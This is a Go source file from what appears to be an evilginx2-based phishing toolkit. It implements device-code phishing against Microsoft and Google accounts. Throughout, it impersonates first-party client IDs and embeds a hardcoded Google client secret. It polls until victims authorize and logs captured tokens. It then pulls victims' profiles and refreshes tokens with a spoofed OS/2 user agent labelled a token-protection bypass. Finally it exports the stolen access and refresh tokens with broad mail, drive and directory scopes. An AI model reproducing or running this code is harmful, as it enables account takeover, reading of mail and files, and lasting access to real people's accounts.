package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// Provider constants
const (
	DCProviderMicrosoft = "microsoft"
	DCProviderGoogle    = "google"
)

// Valid providers
var ValidDCProviders = []string{DCProviderMicrosoft, DCProviderGoogle}

// Microsoft OAuth 2.0 endpoints
const (
	MS_DEVICE_CODE_URL = "https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode"
	MS_TOKEN_URL       = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"
	MS_GRAPH_ME_URL    = "https://graph.microsoft.com/v1.0/me"
)

// Google OAuth 2.0 endpoints
const (
	GOOGLE_DEVICE_CODE_URL = "https://oauth2.googleapis.com/device/code"
	GOOGLE_TOKEN_URL       = "https://oauth2.googleapis.com/token"
	GOOGLE_USERINFO_URL    = "https://www.googleapis.com/oauth2/v3/userinfo"
	GOOGLE_VERIFY_URL      = "https://www.google.com/device"
)

// Device code session states
const (
	DCStateWaiting   = "waiting"   // Waiting for user to authorize
	DCStateCaptured  = "captured"  // Tokens captured successfully
	DCStateExpired   = "expired"   // Device code expired
	DCStateFailed    = "failed"    // Failed with error
	DCStateCancelled = "cancelled" // Cancelled by operator
)

// Known Microsoft OAuth client IDs (first-party apps)
var KnownClientIDs = map[string]struct {
	ClientID string
	Name     string
	Provider string
}{
	// Microsoft clients
	"ms_office":        {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Office", Provider: DCProviderMicrosoft},
	"ms_teams":         {ClientID: "1fec8e78-bce4-4aaf-ab1b-5451cc387264", Name: "Microsoft Teams", Provider: DCProviderMicrosoft},
	"azure_cli":        {ClientID: "04b07795-8ddb-461a-bbee-02f9e1bf7b46", Name: "Azure CLI", Provider: DCProviderMicrosoft},
	"ms_outlook":       {ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Outlook", Provider: DCProviderMicrosoft},
	"ms_graph":         {ClientID: "14d82eec-204b-4c2f-b7e8-296a70dab67e", Name: "Microsoft Graph PowerShell", Provider: DCProviderMicrosoft},
	"ms_auth_broker":   {ClientID: "29d9ed98-a469-4536-ade2-f981bc1d605e", Name: "Microsoft Authentication Broker", Provider: DCProviderMicrosoft},
	"ms_intune":        {ClientID: "d4244571-73c4-45f0-abf3-17c00ec37858", Name: "Microsoft Intune Portal", Provider: DCProviderMicrosoft},
	"ms_onedrive":      {ClientID: "b26aadf8-566f-4478-926f-589f601d9c74", Name: "Microsoft OneDrive", Provider: DCProviderMicrosoft},
	"ms_sharepoint":    {ClientID: "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", Name: "Microsoft SharePoint", Provider: DCProviderMicrosoft},
	"ms_authenticator": {ClientID: "4813382a-8fa7-425e-ab75-3b753aab3abb", Name: "Microsoft Authenticator", Provider: DCProviderMicrosoft},
	// Google clients
	"google_cloud_sdk":     {ClientID: "32555940559.apps.googleusercontent.com", Name: "Google Cloud SDK", Provider: DCProviderGoogle},
	"google_tv":            {ClientID: "300553494095-k0t2me0njk63h2t66mfcl97dpjfomf2p.apps.googleusercontent.com", Name: "Google TV", Provider: DCProviderGoogle},
	"google_device_policy": {ClientID: "607806427481-viqkf4mf7f7oedu95uh6urp1k2knguib.apps.googleusercontent.com", Name: "Google Device Policy", Provider: DCProviderGoogle},
	"google_chrome_sync":   {ClientID: "77185425430.apps.googleusercontent.com", Name: "Google Chrome Sync", Provider: DCProviderGoogle},
	"google_ios":           {ClientID: "49625052041-g2ai52selqdp6bkvb5bki7bk3ns2mrn2.apps.googleusercontent.com", Name: "Google iOS", Provider: DCProviderGoogle},
}

// GoogleClientSecrets stores client_secret for Google OAuth clients that require it
// Google device code flow requires client_secret (unlike Microsoft which uses public clients)
var GoogleClientSecrets = map[string]string{
	"google_cloud_sdk": "ZmssLNjJy2998hD4CTg2ejr2",
	"google_tv":        "",
}

// Default scope presets (Microsoft)
var ScopePresets = map[string]string{
	// Microsoft scopes
	"full":      "https://graph.microsoft.com/.default offline_access",
	"mail":      "Mail.Read Mail.ReadWrite Mail.Send offline_access",
	"files":     "Files.Read.All Files.ReadWrite.All offline_access",
	"user":      "User.Read User.ReadBasic.All offline_access",
	"directory": "Directory.Read.All offline_access",
	"teams":     "ChannelMessage.Read.All Chat.Read Chat.ReadWrite offline_access",
	"minimal":   "openid profile email offline_access",
	// Google scopes
	"gmail":      "https://mail.google.com/ openid email profile",
	"gdrive":     "https://www.googleapis.com/auth/drive openid email profile",
	"gworkspace": "https://mail.google.com/ https://www.googleapis.com/auth/drive https://www.googleapis.com/auth/calendar https://www.googleapis.com/auth/contacts openid email profile",
	"gcalendar":  "https://www.googleapis.com/auth/calendar openid email profile",
	"gcontacts":  "https://www.googleapis.com/auth/contacts openid email profile",
	"gcloud":     "https://www.googleapis.com/auth/cloud-platform openid email profile",
	"gprofile":   "openid email profile",
	"gadmin":     "https://www.googleapis.com/auth/admin.directory.user openid email profile",
	"gall":       "https://mail.google.com/ https://www.googleapis.com/auth/drive https://www.googleapis.com/auth/calendar https://www.googleapis.com/auth/contacts https://www.googleapis.com/auth/cloud-platform openid email profile",
}

// OS/2 Warp User-Agent for token protection bypass (Microsoft-specific)
const OS2_WARP_UA = "Mozilla/4.0 (compatible; MSIE 5.5; OS/2 Warp 4)"

// IsValidDCProvider checks if a provider string is valid
func IsValidDCProvider(provider string) bool {
	for _, p := range ValidDCProviders {
		if p == provider {
			return true
		}
	}
	return false
}

// GetProviderForClient returns the provider for a given client alias
func GetProviderForClient(clientAlias string) string {
	if c, ok := KnownClientIDs[clientAlias]; ok {
		return c.Provider
	}
	return DCProviderMicrosoft // default
}

// GetClientsForProvider returns all client aliases for a given provider
func GetClientsForProvider(provider string) []string {
	var clients []string
	for k, v := range KnownClientIDs {
		if v.Provider == provider {
			clients = append(clients, k)
		}
	}
	return clients
}

// GetScopesForProvider returns scope presets appropriate for a provider
func GetScopesForProvider(provider string) []string {
	var scopes []string
	for k := range ScopePresets {
		switch provider {
		case DCProviderGoogle:
			if strings.HasPrefix(k, "g") || k == "minimal" {
				scopes = append(scopes, k)
			}
		case DCProviderMicrosoft:
			if !strings.HasPrefix(k, "g") || k == "minimal" {
				scopes = append(scopes, k)
			}
		default:
			scopes = append(scopes, k)
		}
	}
	return scopes
}

// DeviceCodeResponse from device code endpoint (works for both Microsoft and Google)
type DeviceCodeResponse struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationURI string `json:"verification_uri"`
	VerificationURL string `json:"verification_url"` // Google uses this field name
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
	Message         string `json:"message"`
}

// TokenResponse from Microsoft's token endpoint
type TokenResponse struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
}

// TokenErrorResponse when polling returns an error
type TokenErrorResponse struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
}

// MSGraphUser from Microsoft Graph /me endpoint
type MSGraphUser struct {
	DisplayName       string `json:"displayName"`
	GivenName         string `json:"givenName"`
	Surname           string `json:"surname"`
	Mail              string `json:"mail"`
	UserPrincipalName string `json:"userPrincipalName"`
	ID                string `json:"id"`
	JobTitle          string `json:"jobTitle"`
	OfficeLocation    string `json:"officeLocation"`
	MobilePhone       string `json:"mobilePhone"`
}

// DeviceCodeSession tracks a single device code flow
type DeviceCodeSession struct {
	ID            string            `json:"id"`
	Provider      string            `json:"provider"` // "microsoft" or "google"
	ClientName    string            `json:"client_name"`
	ClientID      string            `json:"client_id"`
	ClientSecret  string            `json:"-"` // Google requires client_secret
	Scope         string            `json:"scope"`
	Tenant        string            `json:"tenant"`
	DeviceCode    string            `json:"device_code"`
	UserCode      string            `json:"user_code"`
	VerifyURL     string            `json:"verify_url"`
	ExpiresAt     time.Time         `json:"expires_at"`
	Interval      int               `json:"interval"`
	State         string            `json:"state"`
	AccessToken   string            `json:"access_token,omitempty"`
	RefreshToken  string            `json:"refresh_token,omitempty"`
	IDToken       string            `json:"id_token,omitempty"`
	TokenScope    string            `json:"token_scope,omitempty"`
	TokenExpiry   time.Time         `json:"token_expiry,omitempty"`
	Error         string            `json:"error,omitempty"`
	CreatedAt     time.Time         `json:"created_at"`
	CapturedAt    time.Time         `json:"captured_at,omitempty"`
	UserInfo      *MSGraphUser      `json:"user_info,omitempty"`
	GoogleUser    *GoogleUserInfo   `json:"google_user,omitempty"`
	LinkedSession string            `json:"linked_session,omitempty"` // Linked AitM session ID
	Metadata      map[string]string `json:"metadata,omitempty"`
	pollCancel    chan struct{}
	mu            sync.Mutex
}

// GoogleUserInfo from Google's userinfo endpoint
type GoogleUserInfo struct {
	Sub           string `json:"sub"`
	Name          string `json:"name"`
	GivenName     string `json:"given_name"`
	FamilyName    string `json:"family_name"`
	Picture       string `json:"picture"`
	Email         string `json:"email"`
	EmailVerified bool   `json:"email_verified"`
	Locale        string `json:"locale"`
	HD            string `json:"hd"` // Hosted domain (Google Workspace)
}

// DeviceCodeManager manages all device code sessions
type DeviceCodeManager struct {
	sessions  map[string]*DeviceCodeSession
	tenant    string
	mu        sync.RWMutex
	onCapture func(session *DeviceCodeSession) // Callback when tokens are captured
}

// NewDeviceCodeManager creates a new manager
func NewDeviceCodeManager() *DeviceCodeManager {
	return &DeviceCodeManager{
		sessions: make(map[string]*DeviceCodeSession),
		tenant:   "common",
	}
}

// SetTenant sets the default tenant
func (m *DeviceCodeManager) SetTenant(tenant string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.tenant = tenant
}

// GetTenant returns the current tenant
func (m *DeviceCodeManager) GetTenant() string {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.tenant
}

// SetOnCapture sets the callback for token capture events
func (m *DeviceCodeManager) SetOnCapture(fn func(session *DeviceCodeSession)) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.onCapture = fn
}

// RequestDeviceCode initiates a new device code flow (auto-detects provider from client alias)
func (m *DeviceCodeManager) RequestDeviceCode(clientAlias string, scopePreset string) (*DeviceCodeSession, error) {
	// Resolve client ID
	client, ok := KnownClientIDs[clientAlias]
	if !ok {
		return nil, fmt.Errorf("unknown client: %s (available: %s)", clientAlias, m.GetClientNames())
	}

	// Resolve scope
	scope, ok := ScopePresets[scopePreset]
	if !ok {
		// Allow raw scope string
		scope = scopePreset
	}

	provider := client.Provider
	clientSecret := ""
	if provider == DCProviderGoogle {
		if s, ok := GoogleClientSecrets[clientAlias]; ok {
			clientSecret = s
		}
	}

	return m.requestDeviceCodeInternal(provider, client.ClientID, client.Name, clientSecret, scope)
}

// RequestDeviceCodeWithClientID initiates a device code flow with a raw client ID
func (m *DeviceCodeManager) RequestDeviceCodeWithClientID(provider string, clientID string, clientName string, clientSecret string, scope string) (*DeviceCodeSession, error) {
	if provider == "" {
		provider = DCProviderMicrosoft
	}
	return m.requestDeviceCodeInternal(provider, clientID, clientName, clientSecret, scope)
}

// requestDeviceCodeInternal handles the actual device code request for any provider
func (m *DeviceCodeManager) requestDeviceCodeInternal(provider string, clientID string, clientName string, clientSecret string, scope string) (*DeviceCodeSession, error) {
	tenant := m.GetTenant()

	var deviceCodeURL string
	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("scope", scope)

	switch provider {
	case DCProviderGoogle:
		deviceCodeURL = GOOGLE_DEVICE_CODE_URL
		if clientSecret != "" {
			data.Set("client_secret", clientSecret)
		}
	case DCProviderMicrosoft:
		deviceCodeURL = fmt.Sprintf(MS_DEVICE_CODE_URL, tenant)
	default:
		return nil, fmt.Errorf("unsupported provider: %s (supported: microsoft, google)", provider)
	}

	resp, err := http.PostForm(deviceCodeURL, data)
	if err != nil {
		return nil, fmt.Errorf("failed to request device code: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenErrorResponse
		json.Unmarshal(body, &errResp)
		return nil, fmt.Errorf("device code request failed (%d): %s - %s", resp.StatusCode, errResp.Error, errResp.ErrorDescription)
	}

	var dcResp DeviceCodeResponse
	if err := json.Unmarshal(body, &dcResp); err != nil {
		return nil, fmt.Errorf("failed to parse response: %v", err)
	}

	// Google uses "verification_url" field; Microsoft uses "verification_uri"
	verifyURL := dcResp.VerificationURI
	if verifyURL == "" {
		verifyURL = dcResp.VerificationURL
	}
	if verifyURL == "" && provider == DCProviderGoogle {
		verifyURL = GOOGLE_VERIFY_URL
	}

	sessionID := GenRandomAlphanumString(8)
	session := &DeviceCodeSession{
		ID:           sessionID,
		Provider:     provider,
		ClientName:   clientName,
		ClientID:     clientID,
		ClientSecret: clientSecret,
		Scope:        scope,
		Tenant:       tenant,
		DeviceCode:   dcResp.DeviceCode,
		UserCode:     dcResp.UserCode,
		VerifyURL:    verifyURL,
		ExpiresAt:    time.Now().Add(time.Duration(dcResp.ExpiresIn) * time.Second),
		Interval:     dcResp.Interval,
		State:        DCStateWaiting,
		CreatedAt:    time.Now(),
		Metadata:     make(map[string]string),
		pollCancel:   make(chan struct{}),
	}

	if session.Interval < 5 {
		session.Interval = 5
	}

	m.mu.Lock()
	m.sessions[sessionID] = session
	m.mu.Unlock()

	return session, nil
}

// StartPolling begins background polling for token capture
func (m *DeviceCodeManager) StartPolling(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	go m.pollForToken(session)
	return nil
}

// pollForToken continuously polls the token endpoint (provider-aware)
func (m *DeviceCodeManager) pollForToken(session *DeviceCodeSession) {
	var tokenURL string
	switch session.Provider {
	case DCProviderGoogle:
		tokenURL = GOOGLE_TOKEN_URL
	default:
		tokenURL = fmt.Sprintf(MS_TOKEN_URL, session.Tenant)
	}

	ticker := time.NewTicker(time.Duration(session.Interval) * time.Second)
	defer ticker.Stop()

	log.Info("[devicecode] [%s] polling started (provider: %s, code: %s, client: %s)", session.ID, session.Provider, session.UserCode, session.ClientName)

	for {
		select {
		case <-session.pollCancel:
			session.mu.Lock()
			session.State = DCStateCancelled
			session.mu.Unlock()
			log.Info("[devicecode] [%s] polling cancelled", session.ID)
			return

		case <-ticker.C:
			if time.Now().After(session.ExpiresAt) {
				session.mu.Lock()
				session.State = DCStateExpired
				session.mu.Unlock()
				log.Warning("[devicecode] [%s] device code expired", session.ID)
				return
			}

			data := url.Values{}
			data.Set("client_id", session.ClientID)
			data.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
			data.Set("device_code", session.DeviceCode)

			// Google requires client_secret in token requests
			if session.Provider == DCProviderGoogle && session.ClientSecret != "" {
				data.Set("client_secret", session.ClientSecret)
			}

			resp, err := http.PostForm(tokenURL, data)
			if err != nil {
				log.Debug("[devicecode] [%s] poll error: %v", session.ID, err)
				continue
			}

			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				var tokenResp TokenResponse
				if err := json.Unmarshal(body, &tokenResp); err != nil {
					log.Error("[devicecode] [%s] failed to parse token: %v", session.ID, err)
					continue
				}

				session.mu.Lock()
				session.State = DCStateCaptured
				session.AccessToken = tokenResp.AccessToken
				session.RefreshToken = tokenResp.RefreshToken
				session.IDToken = tokenResp.IDToken
				session.TokenScope = tokenResp.Scope
				session.TokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn) * time.Second)
				session.CapturedAt = time.Now()
				session.mu.Unlock()

				log.Success("[devicecode] [%s] *** TOKENS CAPTURED *** (client: %s)", session.ID, session.ClientName)

				// Try to get user info
				go m.fetchUserInfo(session)

				// Fire capture callback
				m.mu.RLock()
				cb := m.onCapture
				m.mu.RUnlock()
				if cb != nil {
					go cb(session)
				}

				return
			}

			// Handle polling errors
			var errResp TokenErrorResponse
			json.Unmarshal(body, &errResp)

			switch errResp.Error {
			case "authorization_pending":
				// Still waiting — this is normal
				continue
			case "slow_down":
				// Back off
				session.mu.Lock()
				session.Interval += 5
				session.mu.Unlock()
				ticker.Reset(time.Duration(session.Interval) * time.Second)
				log.Debug("[devicecode] [%s] slowing down, interval: %ds", session.ID, session.Interval)
			case "authorization_declined":
				session.mu.Lock()
				session.State = DCStateFailed
				session.Error = "User declined authorization"
				session.mu.Unlock()
				log.Warning("[devicecode] [%s] user declined authorization", session.ID)
				return
			case "expired_token":
				session.mu.Lock()
				session.State = DCStateExpired
				session.mu.Unlock()
				log.Warning("[devicecode] [%s] device code expired", session.ID)
				return
			default:
				session.mu.Lock()
				session.State = DCStateFailed
				session.Error = errResp.ErrorDescription
				session.mu.Unlock()
				log.Error("[devicecode] [%s] error: %s", session.ID, errResp.ErrorDescription)
				return
			}
		}
	}
}

// fetchUserInfo fetches user profile from appropriate provider API
func (m *DeviceCodeManager) fetchUserInfo(session *DeviceCodeSession) {
	session.mu.Lock()
	token := session.AccessToken
	provider := session.Provider
	session.mu.Unlock()

	if token == "" {
		return
	}

	var userinfoURL string
	switch provider {
	case DCProviderGoogle:
		userinfoURL = GOOGLE_USERINFO_URL
	default:
		userinfoURL = MS_GRAPH_ME_URL
	}

	req, err := http.NewRequest("GET", userinfoURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Debug("[devicecode] [%s] failed to fetch user info: %v", session.ID, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return
		}

		switch provider {
		case DCProviderGoogle:
			var guser GoogleUserInfo
			if err := json.Unmarshal(body, &guser); err != nil {
				return
			}
			session.mu.Lock()
			session.GoogleUser = &guser
			session.mu.Unlock()

			displayName := guser.Name
			if displayName == "" {
				displayName = guser.Email
			}
			domain := guser.HD
			if domain == "" {
				domain = "gmail.com"
			}
			log.Success("[devicecode] [%s] Google user identified: %s (%s) [%s]", session.ID, displayName, guser.Email, domain)

		default:
			var user MSGraphUser
			if err := json.Unmarshal(body, &user); err != nil {
				return
			}
			session.mu.Lock()
			session.UserInfo = &user
			session.mu.Unlock()

			displayName := user.DisplayName
			if displayName == "" {
				displayName = user.UserPrincipalName
			}
			log.Success("[devicecode] [%s] Microsoft user identified: %s (%s)", session.ID, displayName, user.UserPrincipalName)
		}
	}
}

// RefreshAccessToken refreshes an expired access token using the refresh token
func (m *DeviceCodeManager) RefreshAccessToken(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	return m.doRefreshToken(session, "")
}

// RequestTokenWithBypassUA refreshes with OS/2 Warp UA to bypass token protection
func (m *DeviceCodeManager) RequestTokenWithBypassUA(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	return m.doRefreshToken(session, OS2_WARP_UA)
}

// doRefreshToken performs the actual token refresh (provider-aware)
func (m *DeviceCodeManager) doRefreshToken(session *DeviceCodeSession, userAgent string) error {
	session.mu.Lock()
	refreshToken := session.RefreshToken
	clientID := session.ClientID
	clientSecret := session.ClientSecret
	provider := session.Provider
	tenant := session.Tenant
	scope := session.Scope
	session.mu.Unlock()

	if refreshToken == "" {
		return fmt.Errorf("no refresh token available")
	}

	var tokenURL string
	switch provider {
	case DCProviderGoogle:
		tokenURL = GOOGLE_TOKEN_URL
	default:
		tokenURL = fmt.Sprintf(MS_TOKEN_URL, tenant)
	}

	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", scope)

	// Google requires client_secret for refresh
	if provider == DCProviderGoogle && clientSecret != "" {
		data.Set("client_secret", clientSecret)
	}

	req, err := http.NewRequest("POST", tokenURL, strings.NewReader(data.Encode()))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	if userAgent != "" {
		req.Header.Set("User-Agent", userAgent)
		log.Info("[devicecode] [%s] using bypass UA: %s", session.ID, userAgent)
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("token refresh failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenErrorResponse
		json.Unmarshal(body, &errResp)
		return fmt.Errorf("refresh failed (%d): %s", resp.StatusCode, errResp.ErrorDescription)
	}

	var tokenResp TokenResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return fmt.Errorf("failed to parse token response: %v", err)
	}

	session.mu.Lock()
	session.AccessToken = tokenResp.AccessToken
	if tokenResp.RefreshToken != "" {
		session.RefreshToken = tokenResp.RefreshToken
	}
	session.TokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn) * time.Second)
	session.TokenScope = tokenResp.Scope
	session.mu.Unlock()

	log.Success("[devicecode] [%s] token refreshed successfully (expires: %s)", session.ID, session.TokenExpiry.Format("15:04:05"))
	return nil
}

// GetSession returns a device code session by ID
func (m *DeviceCodeManager) GetSession(sessionID string) (*DeviceCodeSession, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	s, ok := m.sessions[sessionID]
	return s, ok
}

// GetAllSessions returns all device code sessions
func (m *DeviceCodeManager) GetAllSessions() []*DeviceCodeSession {
	m.mu.RLock()
	defer m.mu.RUnlock()

	sessions := make([]*DeviceCodeSession, 0, len(m.sessions))
	for _, s := range m.sessions {
		sessions = append(sessions, s)
	}
	return sessions
}

// DeleteSession removes a device code session
func (m *DeviceCodeManager) DeleteSession(sessionID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[sessionID]
	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	// Cancel polling if active
	if session.State == DCStateWaiting {
		close(session.pollCancel)
	}

	delete(m.sessions, sessionID)
	return nil
}

// DeleteAllSessions removes all device code sessions
func (m *DeviceCodeManager) DeleteAllSessions() int {
	m.mu.Lock()
	defer m.mu.Unlock()

	count := len(m.sessions)
	for _, s := range m.sessions {
		if s.State == DCStateWaiting {
			close(s.pollCancel)
		}
	}
	m.sessions = make(map[string]*DeviceCodeSession)
	return count
}

// CancelPolling cancels polling for a session
func (m *DeviceCodeManager) CancelPolling(sessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	if session.State == DCStateWaiting {
		close(session.pollCancel)
	}
	return nil
}

// ExportTokens exports tokens as JSON
func (m *DeviceCodeManager) ExportTokens(sessionID string) (string, error) {
	m.mu.RLock()
	session, ok := m.sessions[sessionID]
	m.mu.RUnlock()

	if !ok {
		return "", fmt.Errorf("session not found: %s", sessionID)
	}

	session.mu.Lock()
	defer session.mu.Unlock()

	if session.State != DCStateCaptured {
		return "", fmt.Errorf("no tokens captured for session %s (state: %s)", sessionID, session.State)
	}

	export := map[string]interface{}{
		"session_id":    session.ID,
		"provider":      session.Provider,
		"client_name":   session.ClientName,
		"client_id":     session.ClientID,
		"tenant":        session.Tenant,
		"access_token":  session.AccessToken,
		"refresh_token": session.RefreshToken,
		"id_token":      session.IDToken,
		"scope":         session.TokenScope,
		"expires_at":    session.TokenExpiry.Format(time.RFC3339),
		"captured_at":   session.CapturedAt.Format(time.RFC3339),
	}

	if session.UserInfo != nil {
		export["microsoft_user"] = session.UserInfo
	}

	if session.GoogleUser != nil {
		export["google_user"] = session.GoogleUser
	}

	if session.LinkedSession != "" {
		export["linked_aitm_session"] = session.LinkedSession
	}

	data, err := json.MarshalIndent(export, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to export: %v", err)
	}

	return string(data), nil
}

// LinkToAitmSession links a device code session to an AitM proxy session
func (m *DeviceCodeManager) LinkToAitmSession(dcSessionID string, aitmSessionID string) error {
	m.mu.RLock()
	session, ok := m.sessions[dcSessionID]
	m.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", dcSessionID)
	}

	session.mu.Lock()
	session.LinkedSession = aitmSessionID
	session.mu.Unlock()

	return nil
}

// GetClientNames returns a comma-separated list of available client aliases
func (m *DeviceCodeManager) GetClientNames() string {
	names := make([]string, 0, len(KnownClientIDs))
	for k := range KnownClientIDs {
		names = append(names, k)
	}
	return strings.Join(names, ", ")
}

// GetScopePresetNames returns a comma-separated list of available scope presets
func (m *DeviceCodeManager) GetScopePresetNames() string {
	names := make([]string, 0, len(ScopePresets))
	for k := range ScopePresets {
		names = append(names, k)
	}
	return strings.Join(names, ", ")
}

// IsCodeValid returns true if the device code hasn't expired
func (s *DeviceCodeSession) IsCodeValid() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.State == DCStateWaiting && time.Now().Before(s.ExpiresAt)
}

// TimeRemaining returns time remaining before device code expires
func (s *DeviceCodeSession) TimeRemaining() time.Duration {
	s.mu.Lock()
	defer s.mu.Unlock()
	remaining := time.Until(s.ExpiresAt)
	if remaining < 0 {
		return 0
	}
	return remaining
}
